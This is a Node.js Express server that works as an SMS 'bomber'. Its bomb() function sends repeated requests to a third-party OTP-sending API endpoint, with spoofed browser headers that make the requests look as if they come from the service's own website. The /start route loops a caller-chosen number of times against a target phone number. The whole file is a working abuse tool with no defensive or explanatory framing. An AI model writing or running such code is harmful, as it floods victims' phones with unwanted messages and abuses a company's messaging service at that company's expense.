const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors');

const app = express();
const port = 3000;

app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

let clients = [];

app.get('/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    clients.push(res);

    req.on('close', () => {
        clients = clients.filter(client => client !== res);
    });
});

async function bomb(phone) {
    const url = "https://9f8rj0jed1.execute-api.us-east-1.amazonaws.com/api/v2/sendOTP";
    const payload = {
        dial_code: "+63",
        phone: phone,
        type: 1
    };
    const headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/json",
        'sec-ch-ua': "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': "\"Android\"",
        'origin': "https://www.tuvoznow.com",
        'sec-fetch-site': "cross-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.tuvoznow.com/",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i"
    };

    try {
        const response = await axios.post(url, payload, { headers });
        return { success: true, message: response.data };
    } catch (error) {
        return { success: false, message: error.response ? error.response.data : error.message };
    }
}

app.post('/start', async (req, res) => {
    const { phone, amount, cooldown } = req.body;

    for (let i = 0; i < amount; i++) {
        setTimeout(async () => {
            const response = await bomb(phone);
            clients.forEach(client => client.write(`data: ${JSON.stringify(response)}\n\n`));
        }, i * cooldown * 1000);
    }

    res.end();
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
